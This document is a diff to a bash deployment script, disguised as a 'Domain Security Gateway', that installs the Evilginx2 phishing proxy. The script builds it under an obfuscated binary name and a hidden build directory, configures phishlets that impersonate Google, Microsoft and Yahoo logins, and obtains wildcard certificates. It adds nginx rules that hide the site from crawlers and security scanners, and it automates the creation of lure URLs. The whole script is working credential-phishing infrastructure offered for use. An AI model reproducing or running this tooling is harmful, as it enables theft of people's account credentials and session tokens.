@@ -1,13 +1,14 @@
 #!/bin/bash
 # ============================================================================
-# Domain Security Gateway - Complete Automated Installer
+# Domain Security Gateway - HTTPS-Only Automated Installer
+# ============================================================================
+# This script REQUIRES wildcard SSL certificate. NO HTTP FALLBACK.
+# If SSL fails, the installation aborts.
 # ============================================================================
 # Usage: sudo bash deploy.sh --domain example.com --vps-ip 1.2.3.4 --api-token CF-xxxxx
 # ============================================================================
 
 set -euo pipefail
-
-# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -21,7 +22,7 @@ VPS_IP=""
 API_TOKEN=""
 NOTIFY_TOKEN=""
 NOTIFY_ID=""
-HTTP_PORT=8080
+HTTP_PORT=80
 HTTPS_PORT=443
 UNAUTH_URL="https://www.google.com"
 WEBHOOK_SECRET=$(openssl rand -hex 16)
@@ -42,7 +43,8 @@ print_banner() {
     cat << "EOF"
     ╔══════════════════════════════════════════════════════════════════════╗
     ║                    Domain Security Gateway v3.0                      ║
-    ║                   Complete Automated Deployment                      ║
+    ║                    HTTPS-ONLY | No HTTP Fallback                     ║
+    ║                    Wildcard SSL Certificate Required                 ║
     ╚══════════════════════════════════════════════════════════════════════╝
 EOF
     echo -e "${NC}"
@@ -72,6 +74,9 @@ ${GREEN}EXAMPLE:${NC}
     --notify-id "123456789"
 
 EOF
+    echo -e "${RED}NOTE:${NC} This script REQUIRES HTTPS. No HTTP fallback available."
+    echo -e "      SSL certificate issuance is mandatory."
+    echo ""
 }
 
 parse_args() {
@@ -90,6 +95,35 @@ parse_args() {
     if [[ -z "$DOMAIN" ]]; then error "Domain is required"; fi
     if [[ -z "$VPS_IP" ]]; then error "VPS IP is required"; fi
     if [[ -z "$API_TOKEN" ]]; then error "Cloudflare API token is required"; fi
+}
+
+# ============================================================================
+# VALIDATE PREREQUISITES BEFORE STARTING
+# ============================================================================
+validate_prerequisites() {
+    log "Validating prerequisites..."
+    
+    # Check if running as root
+    if [[ $EUID -ne 0 ]]; then
+        error "This script must be run as root (sudo)"
+    fi
+    
+    # Check if domain resolves
+    DOMAIN_IP=$(dig +short "$DOMAIN" | head -1)
+    if [[ -z "$DOMAIN_IP" ]]; then
+        error "Domain $DOMAIN does not resolve. Please add DNS records first."
+    fi
+    
+    # Check if Cloudflare token works
+    ZONE_TEST=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
+        -H "Authorization: Bearer $API_TOKEN" \
+        -H "Content-Type: application/json" | jq -r '.success')
+    
+    if [[ "$ZONE_TEST" != "true" ]]; then
+        error "Invalid Cloudflare API token or insufficient permissions"
+    fi
+    
+    success "Prerequisites validated"
 }
 
 # ============================================================================
@@ -185,17 +219,29 @@ dns_cloudflare_api_token = $API_TOKEN
 EOF
     chmod 600 /etc/letsencrypt/cloudflare.ini
     
+    # Wait for DNS propagation
+    log "Waiting 30 seconds for DNS propagation..."
+    sleep 30
+
     # Attempt to obtain certificate
+    log "Requesting wildcard certificate for *.$DOMAIN (may take 1-2 minutes)..."
     if certbot certonly --dns-cloudflare \
         --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
-        --dns-cloudflare-propagation-seconds 90 \
-        --non-interactive --agree-tos --email "admin@$DOMAIN" \
+        --dns-cloudflare-propagation-seconds 120 \
+        --non-interactive --agree-tos --email "admin@$DOMAIN" --no-eff-email \
         -d "$DOMAIN" -d "*.$DOMAIN"; then
 
         mkdir -p "$APP_DIR/certs"
         # Copy certificates
         cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
         cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"
+
+        # Verify certificates are valid
+        if openssl verify -CAfile <(cat "$APP_DIR/certs/$DOMAIN.crt") "$APP_DIR/certs/$DOMAIN.crt" 2>/dev/null; then
+            success "Wildcard SSL certificate successfully installed and verified"
+        else
+            error "SSL certificate installed but verification failed"
+        fi
 
         # Create a renewal hook for Certbot
         mkdir -p /etc/letsencrypt/renewal-hooks/post
@@ -206,11 +252,8 @@ cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"
 systemctl restart gateway || true
 RENEWAL_HOOK
         chmod +x "/etc/letsencrypt/renewal-hooks/post/gateway-cert-copy.sh"
-
-        success "Wildcard SSL certificate installed"
     else
-        warn "SSL failed - continuing with HTTP mode"
-        HTTPS_PORT=0
+        error "SSL certificate issuance FAILED. HTTPS is required. Check your Cloudflare token and DNS settings."
     fi
 }
 
@@ -224,12 +267,21 @@ phase_dependencies() {
     apt-get install -y git curl wget build-essential golang-go openssl jq \
         dnsutils python3 python3-requests expect nginx fail2ban >/dev/null
     
-    info "Installing Go 1.22.0 (Required for Evilginx 3.0+)..."
+    # Install specific Go version only if not already present to save time
+    if [[ ! -f "/usr/local/go/bin/go" ]] || [[ "$(/usr/local/go/bin/go version)" != *"go1.22.0"* ]]; then
+        info "Installing Go 1.22.0..."
     wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
     rm -rf /usr/local/go
     tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
-    export PATH=$PATH:/usr/local/go/bin
     rm -f go1.22.0.linux-amd64.tar.gz
+    fi
+
+    # Ensure the current session uses the correct Go path
+    export PATH=/usr/local/go/bin:$PATH
+    
+    # Set Go proxy for faster/correct downloads
+    echo 'export GOPROXY=https://goproxy.io,direct' >> ~/.bashrc
+    echo 'export GO111MODULE=on' >> ~/.bashrc
     
     success "Dependencies installed"
 }
@@ -245,12 +297,17 @@ phase_build() {
     git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache
     cd /tmp/.build_cache
     
+    # Set Go proxy
+    export GOPROXY=https://goproxy.io,direct
+    export GO111MODULE=on
+    
+    # Run go mod tidy first
+    /usr/local/go/bin/go mod tidy
+    
     # Obfuscate the binary name during build
     /usr/local/go/bin/go build -o sys-svc 
     
-    if [[ ! -f "sys-svc" ]]; then
-        error "Build failed - sys-svc binary not found in $(pwd)"
-    fi
+    [[ ! -f "sys-svc" ]] && error "Build failed - sys-svc binary not found"
 
     mkdir -p "$APP_DIR"/{config,phishlets,certs,storage,logs,notifications,html}
     cp sys-svc /usr/local/bin/sys-svc
@@ -265,7 +322,7 @@ phase_build() {
 phase_deploy_resources() {
     log "Deploying resources from local files..."
     
-    # Aligned naming with Phishlet Go-templates
+    # Generate random subdomain prefixes
     EP1="gw-$(openssl rand -hex 3)"
     EP2="auth-$(openssl rand -hex 3)"
     EP3="portal-$(openssl rand -hex 3)"
@@ -273,25 +330,31 @@ phase_deploy_resources() {
     echo "$EP1" > "$APP_DIR/.ep1"
     echo "$EP2" > "$APP_DIR/.ep2"
     echo "$EP3" > "$APP_DIR/.ep3"
-    
-    # Copy from local editable resources
+
+    # Create phishlets directory (NOT resources)
+    mkdir -p "$APP_DIR/phishlets"
+
+    # Copy from local phishlets directory
     cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/phishlets/"
     cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/phishlets/"
     cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/phishlets/"
     
-    # Enhanced sed to match .EndpointX naming and inject secrets
+    # Verify files copied
+    [[ ! -f "$APP_DIR/phishlets/google.yaml" ]] && error "Failed to copy google.yaml to $APP_DIR/phishlets/"
+    
+    # Replace placeholders
     sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/phishlets/"*.yaml
-    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/phishlets/"*.yaml
-    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/phishlets/"*.yaml
-    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/phishlets/"*.yaml
+    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/phishlets/yahoo.yaml"
+    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/phishlets/microsoft.yaml"
+    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/phishlets/google.yaml"
     sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/phishlets/"*.yaml
     sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$APP_DIR/phishlets/"*.yaml
     sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/phishlets/"*.yaml
     
-    success "Resources deployed"
-    log "  Endpoint 1: $EP1.$DOMAIN"
-    log "  Endpoint 2: $EP2.$DOMAIN"
-    log "  Endpoint 3: $EP3.$DOMAIN"
+    success "Phishlets deployed"
+    log "  Yahoo: $EP1.$DOMAIN"
+    log "  Microsoft: $EP2.$DOMAIN"
+    log "  Google: $EP3.$DOMAIN"
 }
 
 # ============================================================================
@@ -355,7 +418,17 @@ EOF
 # PHASE 7.5: STEALTH COMPONENTS (NGINX & FAIL2BAN)
 # ============================================================================
 phase_stealth_setup() {
-    log "Setting up Nginx Reverse Proxy and Fail2Ban..."
+    log "Setting up stealth components (Nginx + Fail2Ban)..."
+
+    # Ensure HTML directory exists for the bot-trap
+    mkdir -p "$APP_DIR/html"
+
+    # Stop any conflicting web services that might hold port 80
+    if systemctl is-active --quiet apache2; then
+        warn "Apache2 detected. Stopping to prevent port conflict..."
+        systemctl stop apache2
+        systemctl disable apache2
+    fi
 
     # Bot Trap Page
     mkdir -p "$APP_DIR/html"
@@ -370,18 +443,39 @@ HTML
 server {
     listen 80 default_server;
     server_name _;
+    
+    # Bot detection
     if (\$http_user_agent ~* (bot|crawler|spider|scanner|curl|wget|python)) { return 404; }
     if (\$http_user_agent = "") { return 404; }
+    
+    # Redirect all HTTP to HTTPS
+    return 301 https://\$host\$request_uri;
+}
+
+server {
+    listen 443 ssl default_server;
+    server_name _;
+    
+    ssl_certificate $APP_DIR/certs/$DOMAIN.crt;
+    ssl_certificate_key $APP_DIR/certs/$DOMAIN.key;
+    
+    # Bot detection
+    if (\$http_user_agent ~* (bot|crawler|spider|scanner|curl|wget|python)) { return 404; }
+    if (\$http_user_agent = "") { return 404; }
+    
     location / {
-        proxy_pass http://127.0.0.1:8080;
+        # Internal high port for Evilginx
+        proxy_pass https://127.0.0.1:8443;
         proxy_set_header Host \$host;
         proxy_set_header X-Real-IP \$remote_addr;
         proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
     }
 }
 EOF
     ln -sf /etc/nginx/sites-available/gateway /etc/nginx/sites-enabled/
     rm -f /etc/nginx/sites-enabled/default
+    nginx -t || error "Nginx configuration invalid"
     systemctl restart nginx
 
     # Fail2Ban Configuration
@@ -570,14 +664,10 @@ EOF
 # ============================================================================
 phase_generate_urls() {
     log "Configuring service and generating access URLs..."
-    info "Starting interactive configuration (this may take up to 60 seconds)..."
-
-    # Stop service before configuration to prevent port 80/443 conflicts
-    systemctl stop gateway 2>/dev/null || true
-    sleep 2
     
-    # Temporarily disable daemon mode so expect can interact with the console
-    sed -i "s/daemon: true/daemon: false/" "$APP_DIR/config/config.yaml"
+    systemctl stop gateway 2>/dev/null || true
+    sleep 5
+    sed -i 's/daemon: true/daemon: false/' "$APP_DIR/config/config.yaml"
     
     EP1=$(cat "$APP_DIR/.ep1")
     EP2=$(cat "$APP_DIR/.ep2")
@@ -605,17 +695,17 @@ expect "gateway>" { send "phishlets enable google\r" }
 expect "gateway>" { send "lures create yahoo\r" }
 expect -re "created lure with ID: (\\d+)" { set yid $expect_out(1,string) }
 expect "gateway>" { send "lures get-url $yid\r" }
-expect -re "(https://[^\\r]+)" { set yurl $expect_out(1,string) }
+expect -re "(https?://[^\\r]+)" { set yurl $expect_out(1,string) }
 
 expect "gateway>" { send "lures create microsoft\r" }
 expect -re "created lure with ID: (\\d+)" { set mid $expect_out(1,string) }
 expect "gateway>" { send "lures get-url $mid\r" }
-expect -re "(https://[^\\r]+)" { set murl $expect_out(1,string) }
+expect -re "(https?://[^\\r]+)" { set murl $expect_out(1,string) }
 
 expect "gateway>" { send "lures create google\r" }
 expect -re "created lure with ID: (\\d+)" { set gid $expect_out(1,string) }
 expect "gateway>" { send "lures get-url $gid\r" }
-expect -re "(https://[^\\r]+)" { set gurl $expect_out(1,string) }
+expect -re "(https?://[^\\r]+)" { set gurl $expect_out(1,string) }
 
 expect "gateway>" { send "exit\r" }
 
@@ -629,10 +719,10 @@ EOF
     export DOMAIN VPS_IP EP1 EP2 EP3 APP_DIR
     output=$(/tmp/configure.exp 2>/dev/null)
     rm -f /tmp/configure.exp
-
-    # Re-enable daemon mode for the background service
-    sed -i "s/daemon: false/daemon: true/" "$APP_DIR/config/config.yaml"
     
+    # After expect completes, re-enable daemon mode
+    sed -i 's/daemon: false/daemon: true/' "$APP_DIR/config/config.yaml"
+
     Y_URL=$(echo "$output" | grep "Y_URL=" | cut -d'=' -f2-)
     M_URL=$(echo "$output" | grep "M_URL=" | cut -d'=' -f2-)
     G_URL=$(echo "$output" | grep "G_URL=" | cut -d'=' -f2-)
@@ -671,13 +761,10 @@ print_summary() {
     echo -e "${GREEN}                    DEPLOYMENT COMPLETE!                         ${NC}"
     echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
     echo ""
-    echo -e "${CYAN}📧 ACTIVE ACCESS URLs:${NC}"
+    echo -e "${CYAN}📧 ACTIVE HTTPS URLs:${NC}"
     echo -e "  ${GREEN}Yahoo:${NC}     $Y_URL"
     echo -e "  ${GREEN}Microsoft:${NC}  $M_URL"
     echo -e "  ${GREEN}Google:${NC}     $G_URL"
-    if [[ "$HTTPS_PORT" -eq 0 ]]; then
-        echo -e "${YELLOW}[!] WARNING: SSL certificate failed to obtain. Running in HTTP mode.${NC}"
-    fi
     echo ""
     echo -e "${CYAN}🔧 MANAGEMENT COMMANDS:${NC}"
     echo -e "  Status:     systemctl status gateway"
@@ -687,7 +774,7 @@ print_summary() {
     echo -e "  Console:    sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets"
     echo -e "              (Use 'exit' to quit the console without stopping the service)"
     echo ""
-    echo -e "${CYAN}📁 EDIT RESOURCES (if needed):${NC}"
+    echo -e "${CYAN}📁 EDIT PHISHLETS (if needed):${NC}"
     echo -e "  nano $APP_DIR/phishlets/google.yaml"
     echo -e "  nano $APP_DIR/phishlets/microsoft.yaml"
     echo -e "  nano $APP_DIR/phishlets/yahoo.yaml"
@@ -709,9 +796,13 @@ print_summary() {
 main() {
     print_banner
     parse_args "$@"
+    
+    validate_prerequisites
     phase_check_files
+    
     phase_dns
-    phase_ssl
+    phase_ssl               # REQUIRED - NO FALLBACK
+    
     phase_dependencies
     phase_build
     phase_deploy_resources
